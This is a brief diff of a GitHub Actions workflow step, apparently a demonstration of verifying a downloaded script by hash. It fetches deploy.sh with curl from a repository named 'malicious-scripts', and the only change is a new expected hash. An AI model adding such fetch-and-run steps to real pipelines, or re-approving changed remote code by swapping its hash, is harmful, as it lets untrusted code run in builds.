@@ -16,7 +16,7 @@ jobs:
       - name: Download and Execute External Script (With Hash Verification)  
         run: |  
           DEPLOY_URL="https://raw.githubusercontent.com/LinusTimoDaniels/malicious-scripts/main/deploy.sh"  
-          EXPECTED_HASH="5128cdd384a2e90bccda2d1d39d7beb27696e5045534b4396b4bdb2c16f4338d"
+          EXPECTED_HASH="2754520677339efc88aa02dca4ca97e92549349259751300a65fc7ce93b622dc"
 
           # Download script
           curl -o deploy.sh "$DEPLOY_URL"  
